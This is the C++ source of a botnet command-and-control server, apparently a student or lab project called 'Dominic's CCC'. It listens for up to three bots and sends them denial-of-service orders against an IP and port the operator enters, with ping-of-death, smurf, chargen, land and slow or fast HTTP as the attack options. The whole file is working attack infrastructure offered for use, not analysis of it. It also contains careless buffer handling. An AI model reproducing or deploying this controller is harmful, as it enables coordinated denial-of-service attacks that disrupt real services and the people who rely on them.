#include <stdlib.h>
#include <iostream>
#include <string.h>
#include <fstream>
#include <thread>
#include <signal.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <vector>

using namespace std;

bool start = false;
bool server_started = false;
bool attacking = false;

string attack = "None";
string target_ip = "None";

thread tListener;
vector<thread> threads;
int target_port = 0;
int server_fd, valread, client_socket;
struct sockaddr_in server_address, client_address;
struct netbot {
	int id;
	bool start;
	string ip_address;
};

vector<netbot> netbots;
string message;

pid_t pid;

string server_status()
{	
	if (attacking == true) 
	{
		return "\nServer attacking (" + attack + ") target: " + target_ip + "\n";
	}
	else if (target_ip == "None" && attack == "None" && start == false)
	{
		return "\nServer started, waiting for client connections...\n";
	}
	else if (attack == "HALT" && target_ip != "None")
	{
		return "\nAttack halted. Waiting for commands.\n";
	}
	else if (start == true && attack == "None")
	{
		return "\nPlease, enter attack type.\n";
	}
	else if (start == true && target_ip == "None")
	{
		return "\nPlease, enter target parameters.\n";
	}
	else
	{
		return "\nServer started, waiting for client connections...\n";
	}
}

void setup_target_parameters()
{	
	cout << "Enter target ip address: \n";
	cin >> target_ip;
	cout << "\n Enter target port: \n";
	cin >> target_port;
}

void start_attack()
{
	start = true;
}

void printASCII(string fileName)
{
	string line = "";
	ifstream inFile;
	inFile.open(fileName);
	if (inFile.is_open())
	{
		while(getline(inFile, line))
		{
			cout << line << endl;
		}
	} else {
		cout << "File failed to load. " << endl;
		cout << "Nothing to display." << endl;
	}
	inFile.close();
}


void menu_header()
{
	string fileName = "dos_art.txt";
	printASCII(fileName);
}

void list_bots()
{
	cout << "Bots connected " << "(" << netbots.size() <<"):\n";
	vector<netbot>::iterator iter = netbots.begin();

	for(iter; iter < netbots.end(); iter++) 
	{
		cout << "bot: " << (*iter).ip_address << "\n";
	}

	cout << endl;

	sleep(3);
}

void setup_attack_type()
{
	char char_choice[1];
	int int_choice = 0;
	do
	{
		system("clear");
		menu_header();
		cout << "\n";
		cout << "Attack options: \n\n";
		cout << "1. Ping of death attack\n";
		cout << "2. Smurf attack\n";
		cout << "3. Chargen attack\n";
		cout << "4. Land attack\n";
		cout << "5. Slow HTTP attack\n";
		cout << "6. Fast HTTP attack\n";
		cout << "7. exit\n";

		cin >> char_choice;
		int_choice = atoi(char_choice);

		
		switch(int_choice) 
		{
			case 1: 
				attack = "POD";
				break;
			case 2:
				attack = "SMURF";
				break;
			case 3:
				attack = "CHARGEN";
				break;
			case 4:
				attack = "LAND";
				break;
			case 5:
				attack = "SLOWHTTP";
				break;
			case 6:
				attack = "FASTHTTP";
				break;
			case 7:
				break;
			default:
				cout << "Wrong choice. Enter option again.";
				break;

		}
	} while (int_choice != 1 && int_choice != 2 && int_choice != 3 && int_choice != 4 && int_choice != 5 && int_choice != 6 && int_choice != 7);

}

void disconnection_listener(int i)
{	
	char buffer[1024] = { 0 };
	while(true)
	{
		bzero(&buffer, sizeof(buffer));
		int bytes = recv(i, buffer, 1024, 0);	

		if (bytes == 0) // netbot disconnected
		{	
			vector<netbot>::iterator iter = netbots.begin();
			for(iter; iter < netbots.end(); iter++) 
			{
				if ((*iter).id == i) 
				{
					netbots.erase(iter);
					iter--;
				}
			}
			
			close(i);
			return;
		}
	}
}

void threaded(int i)
{
	char buffer[1024] = { 0 };	
	cout << "\nClient Socket File Descriptor: " << i << "\n";
	
	bzero(&buffer, sizeof(buffer));
	int bytes = recv(i, buffer, 1024, 0);	
	
	thread dListener = thread(disconnection_listener, i);
	dListener.detach();

	while (1)
	{		
		netbot bot;
	
		if (start == true) 
		{	
			bool found = false;
			vector<netbot>::iterator iter = netbots.begin();
			for(iter; iter < netbots.end(); iter++) 
			{
				if ((*iter).id == i) 
				{	
					found = true;
					bot = *iter;
					break;				
				}
			}
			
			if (!found) {
				close(i);
				return;
			}
			
			bot.start = true;
		}

		if (attack != "None" && target_ip != "None" && target_port != 0 && bot.start == true)
	       	{	
	       		if (attack == "HALT") {
	       			message = attack;
	       		} else {
	       			message = attack + "_" + target_ip + "_" + to_string(target_port);
	       			attacking = true;
	       		}
	       			
			send(i, message.c_str(), strlen(message.c_str()), 0);
			cout << "Server attack sent\n";
			sleep(1);
			bot.start = false;
			start = false;
		} 
	}	
}

void connection_listener(int i)
{
	while(netbots.size() != 3)
	{
		socklen_t client_length = sizeof(client_address);
		if ((client_socket = accept(server_fd, (struct sockaddr *) &client_address, &client_length)) < 0) {
			perror("accept");
			exit(EXIT_FAILURE);
		}

		netbots.push_back({ client_socket, false, inet_ntoa(client_address.sin_addr) });
	
		cout << "\nclient connected: " << inet_ntoa(client_address.sin_addr) << "\t Total Bots Connected: " << netbots.size() << endl;

		threads.push_back(thread(threaded, client_socket));
  		threads.back().detach();
	}

}


void start_server()
{
	if (server_started == false)
	{
		server_started = true;
		int opt = 1;
		int addrlen = sizeof(server_address);
		char buffer[1024] = { 0 };
		char* hello = "Hello from server";
	
		// Creating socket file descriptor
		if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
			perror("Socket failed");
			exit(EXIT_FAILURE);
		}

		// Forcefully attaching socket to the port specified
			if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt))) {
			perror("setsockopt");
			exit(EXIT_FAILURE);
		}

		server_address.sin_family = AF_INET;
		server_address.sin_addr.s_addr = inet_addr("10.0.2.4");
		server_address.sin_port = htons(8080);

		// Binding address and port to the socket
		if (bind(server_fd, (struct sockaddr*)&server_address, sizeof(server_address)) < 0) {
			perror("bind failed");
			exit(EXIT_FAILURE);
		}

		// Wait for clients connections
		if (listen(server_fd, 3) < 0) {
			perror("listem");
			exit(EXIT_FAILURE);
		}
        
		tListener = thread(connection_listener, 1);
		tListener.detach();
	}
		
	char char_choice[1];
	int int_choice = 0;
	do
	{
		system("clear");
		menu_header();
		cout << "\n";
		cout << "Server options: \n\n";
		cout << "1. setup target parameters\n";
		cout << "2. setup attack type\n";
		cout << "3. start attack\n";
		cout << "4. halt attack\n";
		cout << "5. list connected bots\n";
		cout << "6. shutdown server\n";	
		cout << server_status();

		cin >> char_choice;
		int_choice = atoi(char_choice);

		
		switch(int_choice) 
		{
			case 1: 
				setup_target_parameters();
				break;
			case 2:
				setup_attack_type();
				break;
			case 3: 
				start_attack();
				break;
			case 4: 
				attack = "HALT";
				attacking = false;
				start = true;
				break;
			case 5:
				list_bots();
				break;
			case 6:
				kill(-pid, SIGKILL);
				shutdown(server_fd, SHUT_RDWR);
				break;
			default:
				cout << "Wrong choice. Enter option again.";
				break;

		}
	} while (int_choice != 6);
}

void play_music(string songName)
{
	string cmd = "canberra-gtk-play -f music/" + songName;
	system(cmd.c_str());
}

void main_menu()
{
	char char_choice[1];
	int int_choice = 0;
	do
	{
		system("clear");
		menu_header();
		cout << "\n";
		cout << "Dominic's CCC menu selection: \n\n";
		cout << "1. start server\n";
		cout << "2. Exit\n";
		cin >> char_choice;
		int_choice = atoi(char_choice);

		
		switch(int_choice) 
		{
			case 1:
				start_server();
				break;
			case 2:
				kill(-pid, SIGKILL);
				break;
			default:
				cout << "Wrong choice. Enter option again.";
				break;

		}
	} while(int_choice != 2);
}

int main()
{	
	pid = fork();
	if (pid == 0) { // child procress
		setpgid(getpid(), getpid());
		system("canberra-gtk-play -f music/music.wav");
	} else {
		main_menu();
		kill(-pid, SIGKILL);
		cout << "\nThank you for using dominic's CCC. Have a great day!";
		return 0;
	}
}
